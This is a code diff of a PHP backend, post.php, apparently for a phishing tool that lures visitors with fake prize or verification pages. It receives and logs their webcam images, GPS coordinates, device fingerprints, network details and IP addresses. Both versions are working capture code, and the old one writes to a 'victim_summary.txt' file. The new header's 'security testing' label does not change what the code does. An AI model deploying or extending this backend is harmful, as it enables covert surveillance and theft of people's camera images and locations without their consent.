@@ -1,125 +1,138 @@
 <?php
+// post.php - Enhanced data capture backend for security testing
 
-$date = date('dMYHis');
-
+// Create logs directory if it doesn't exist
 if (!file_exists('logs')) {
-    mkdir('logs', 0777, true);
+    mkdir('logs', 0755, true);
 }
 
-if (!empty($_POST['cat'])) {
-    $imageData = $_POST['cat'];
-    $filteredData = substr($imageData, strpos($imageData, ",")+1);
-    $unencodedData = base64_decode($filteredData);
+// Get the current timestamp
+$timestamp = date('Y-m-d H:i:s');
+$date = date('Y-m-d');
+
+// Function to log data
+function logData($filename, $data) {
+    $logEntry = json_encode([
+        'timestamp' => date('Y-m-d H:i:s'),
+        'data' => $data,
+        'ip' => $_SERVER['REMOTE_ADDR'],
+        'user_agent' => $_SERVER['HTTP_USER_AGENT']
+    ]) . PHP_EOL;
     
-    $fp = fopen('cam_' . $date . '.png', 'wb');
-    fwrite($fp, $unencodedData);
-    fclose($fp);
-    
-    error_log("[" . $date . "] Image captured\n", 3, "logs/capture_log.txt");
+    file_put_contents("logs/$filename", $logEntry, FILE_APPEND | LOCK_EX);
 }
 
-if (!empty($_POST['device_data'])) {
-    $deviceData = json_decode($_POST['device_data'], true);
-    $deviceLog = "=== DEVICE INFO [" . $date . "] ===\n";
-    $deviceLog .= "User Agent: " . ($deviceData['userAgent'] ?? 'N/A') . "\n";
-    $deviceLog .= "Platform: " . ($deviceData['platform'] ?? 'N/A') . "\n";
-    $deviceLog .= "Language: " . ($deviceData['language'] ?? 'N/A') . "\n";
-    $deviceLog .= "Screen: " . ($deviceData['screenResolution'] ?? 'N/A') . "\n";
-    $deviceLog .= "Timezone: " . ($deviceData['timezone'] ?? 'N/A') . "\n";
-    $deviceLog .= "Hardware Concurrency: " . ($deviceData['hardwareConcurrency'] ?? 'N/A') . "\n";
-    $deviceLog .= "Device Memory: " . ($deviceData['deviceMemory'] ?? 'N/A') . "\n";
-    $deviceLog .= "========================\n\n";
-    
-    file_put_contents('logs/device_info.txt', $deviceLog, FILE_APPEND);
+// Function to save captured images
+function saveImage($base64Data, $counter) {
+    if (preg_match('/^data:image\/(\w+);base64,/', $base64Data)) {
+        $data = substr($base64Data, strpos($base64Data, ',') + 1);
+        $data = base64_decode($data);
+        
+        if ($data !== false) {
+            $filename = "logs/captures/image_" . date('Ymd_His') . "_$counter.jpg";
+            file_put_contents($filename, $data);
+            return $filename;
+        }
+    }
+    return false;
 }
 
-if (!empty($_POST['location_data'])) {
-    $locationData = json_decode($_POST['location_data'], true);
-    $locationLog = "=== LOCATION INFO [" . $date . "] ===\n";
-    $locationLog .= "Latitude: " . ($locationData['lat'] ?? 'N/A') . "\n";
-    $locationLog .= "Longitude: " . ($locationData['lng'] ?? 'N/A') . "\n";
-    $locationLog .= "Accuracy: " . ($locationData['accuracy'] ?? 'N/A') . " meters\n";
-    $locationLog .= "Address: " . ($locationData['address'] ?? 'N/A') . "\n";
-    $locationLog .= "City: " . ($locationData['city'] ?? 'N/A') . "\n";
-    $locationLog .= "Country: " . ($locationData['country'] ?? 'N/A') . "\n";
-    $locationLog .= "========================\n\n";
+// Check what type of data we received
+if (isset($_POST['cat'])) {
+    // Handle image capture
+    $captureCount = isset($_POST['capture_id']) ? $_POST['capture_id'] : 'unknown';
+    $imagePath = saveImage($_POST['cat'], $captureCount);
     
-    file_put_contents('logs/location_info.txt', $locationLog, FILE_APPEND);
+    $captureData = [
+        'type' => 'image_capture',
+        'capture_number' => $captureCount,
+        'image_saved' => $imagePath ? true : false,
+        'image_path' => $imagePath
+    ];
     
-    $csvLine = $date . "," . 
-               ($locationData['lat'] ?? '') . "," . 
-               ($locationData['lng'] ?? '') . "," . 
-               ($locationData['accuracy'] ?? '') . "," . 
-               ($locationData['city'] ?? '') . "," . 
-               ($locationData['country'] ?? '') . "\n";
-    
-    file_put_contents('logs/gps_coordinates.csv', $csvLine, FILE_APPEND);
-}
-
-if (!empty($_POST['network_data'])) {
-    $networkData = json_decode($_POST['network_data'], true);
-    $networkLog = "=== NETWORK INFO [" . $date . "] ===\n";
-    $networkLog .= "IP Address: " . ($networkData['ip'] ?? 'N/A') . "\n";
-    $networkLog .= "Connection Type: " . ($networkData['type'] ?? 'N/A') . "\n";
-    $networkLog .= "Effective Type: " . ($networkData['effectiveType'] ?? 'N/A') . "\n";
-    $networkLog .= "Downlink: " . ($networkData['downlink'] ?? 'N/A') . " Mbps\n";
-    $networkLog .= "RTT: " . ($networkData['rtt'] ?? 'N/A') . " ms\n";
-    $networkLog .= "========================\n\n";
-    
-    file_put_contents('logs/network_info.txt', $networkLog, FILE_APPEND);
-}
-
-if (!empty($_POST['enhanced_payload'])) {
-    $enhancedData = json_decode($_POST['enhanced_payload'], true);
-    $completeLog = "=== COMPLETE CAPTURE [" . $date . "] ===\n";
-    $completeLog .= json_encode($enhancedData, JSON_PRETTY_PRINT);
-    $completeLog .= "\n================================\n\n";
-    
-    file_put_contents('logs/complete_captures.json', $completeLog, FILE_APPEND);
-}
-
-if (!empty($_POST['periodic_update'])) {
-    $updateLog = "=== PERIODIC UPDATE [" . $date . "] ===\n";
-    $updateLog .= "Capture Count: " . ($_POST['captureCount'] ?? 'N/A') . "\n";
-    $updateLog .= "========================\n\n";
-    
-    file_put_contents('logs/periodic_updates.txt', $updateLog, FILE_APPEND);
-}
-
-if (!empty($_POST['event'])) {
-    $eventLog = "=== EVENT: " . $_POST['event'] . " [" . $date . "] ===\n";
-    $eventLog .= "Timestamp: " . ($_POST['timestamp'] ?? 'N/A') . "\n";
-    
-    if (!empty($_POST['prize'])) {
-        $eventLog .= "Prize: $" . $_POST['prize'] . "\n";
-        $eventLog .= "Range: $" . $_POST['min'] . " - $" . $_POST['max'] . "\n";
+    // Store device data if provided
+    if (isset($_POST['device_data'])) {
+        $captureData['device_info'] = json_decode($_POST['device_data'], true);
     }
     
-    if (!empty($_POST['finalCaptureCount'])) {
-        $eventLog .= "Total Captures: " . $_POST['finalCaptureCount'] . "\n";
+    // Store location data if provided
+    if (isset($_POST['location_data'])) {
+        $captureData['location'] = json_decode($_POST['location_data'], true);
     }
     
-    $eventLog .= "========================\n\n";
-    
-    file_put_contents('logs/events.txt', $eventLog, FILE_APPEND);
-}
-
-if (!empty($_POST['device_data']) || !empty($_POST['location_data'])) {
-    $summaryLine = $date . " | ";
-    
-    if (!empty($_POST['location_data'])) {
-        $loc = json_decode($_POST['location_data'], true);
-        $summaryLine .= ($loc['city'] ?? 'Unknown') . ", " . ($loc['country'] ?? 'Unknown');
-    } else {
-        $summaryLine .= "Location Unknown";
+    // Store enhanced payload if provided
+    if (isset($_POST['enhanced_payload'])) {
+        $enhancedData = json_decode($_POST['enhanced_payload'], true);
+        $captureData['enhanced'] = $enhancedData;
     }
     
-    $summaryLine .= " | " . ($_POST['capture_id'] ?? '0') . " captures\n";
-    file_put_contents('logs/victim_summary.txt', $summaryLine, FILE_APPEND);
+    logData("captures_$date.log", $captureData);
+    
+    echo json_encode(['success' => true, 'message' => 'Data received']);
+    
+} elseif (isset($_POST['device_fingerprint'])) {
+    // Handle device fingerprint data
+    $deviceData = [
+        'type' => 'device_fingerprint',
+        'fingerprint' => json_decode($_POST['device_fingerprint'], true),
+        'network' => isset($_POST['network_info']) ? json_decode($_POST['network_info'], true) : null
+    ];
+    
+    logData("devices_$date.log", $deviceData);
+    echo json_encode(['success' => true]);
+    
+} elseif (isset($_POST['location_data']) && isset($_POST['data_type']) && $_POST['data_type'] == 'location') {
+    // Handle location data
+    $locationData = [
+        'type' => 'location',
+        'location' => json_decode($_POST['location_data'], true)
+    ];
+    
+    logData("locations_$date.log", $locationData);
+    echo json_encode(['success' => true]);
+    
+} elseif (isset($_POST['event'])) {
+    // Handle events (verification_complete, reward_claimed, session_end)
+    $eventData = [
+        'event' => $_POST['event'],
+        'timestamp' => $_POST['timestamp'],
+        'data' => $_POST
+    ];
+    
+    logData("events_$date.log", $eventData);
+    echo json_encode(['success' => true]);
+    
+} elseif (isset($_POST['periodic_update'])) {
+    // Handle periodic updates
+    $updateData = [
+        'type' => 'periodic_update',
+        'capture_count' => $_POST['captureCount'],
+        'device_data' => isset($_POST['device_data']) ? json_decode($_POST['device_data'], true) : null,
+        'location_data' => isset($_POST['location_data']) ? json_decode($_POST['location_data'], true) : null
+    ];
+    
+    logData("updates_$date.log", $updateData);
+    echo json_encode(['success' => true]);
+    
+} else {
+    // Log any other received data
+    $unknownData = [
+        'type' => 'unknown',
+        'post_data' => $_POST,
+        'get_data' => $_GET
+    ];
+    
+    logData("unknown_$date.log", $unknownData);
+    echo json_encode(['success' => false, 'message' => 'No valid data received']);
 }
 
-header('Content-Type: application/json');
-echo json_encode(['status' => 'success', 'message' => 'Data received']);
+// Log visitor info regardless
+$visitorInfo = [
+    'ip' => $_SERVER['REMOTE_ADDR'],
+    'user_agent' => $_SERVER['HTTP_USER_AGENT'],
+    'referer' => isset($_SERVER['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER'] : 'direct',
+    'timestamp' => date('Y-m-d H:i:s')
+];
+logData("visitors_$date.log", $visitorInfo);
 
-exit();
 ?>
